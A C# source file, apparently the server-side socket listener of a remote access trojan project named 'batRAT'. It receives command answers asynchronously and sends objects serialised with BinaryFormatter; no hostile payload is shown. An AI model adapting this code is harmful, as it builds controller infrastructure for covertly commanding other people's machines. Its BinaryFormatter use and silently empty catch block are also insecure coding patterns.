using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net.Sockets;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

using batRAT;
using batRAT.Commands;

namespace Server.Core {
    public class Listener {

        public Socket socket;

        bServer server;
        DataHandler dataHandler;

        public Listener(bServer _server, Socket _socket) {
            server = _server;
            socket = _socket;
            dataHandler = new DataHandler(this);
        }

        public void StartReceive() {
            StateObject stateObj = new StateObject();
            stateObj.socket = socket;
            stateObj.socket.BeginReceive(stateObj.buffer, 0, stateObj.buffer.Length, 0, (ar) => {
                StateObject state = (StateObject)ar.AsyncState;
                Socket handler = state.socket;

                int bytesReceived = handler.EndReceive(ar);

                CommandAnswer answer = dataHandler.HandleAnswer(state, bytesReceived);
                server.OnDataReceived(state.socket, answer);

                if(bytesReceived != 0) {
                    StartReceive();
                }

            }, stateObj);
            
        }

        public void Send<T>(T _data, Socket _socket) {
            if(_data == null) {
                return;
            }

            byte[] buffer;
            using(var ms = new MemoryStream()) {
                ms.Seek(0, SeekOrigin.Begin);
                new BinaryFormatter().Serialize(ms, _data);
                buffer = ms.ToArray();
            }

            _socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, OnSend, _socket);
        }

        void OnSend(IAsyncResult ar) {
            try {
                Socket handler = (Socket)ar.AsyncState;

                int bytesSent = handler.EndSend(ar);
                if(bytesSent <= 0) {
                    return;
                }
                server.OnDataSent(handler, bytesSent);
            }
            catch(Exception e) {

            }
        }
    }
}
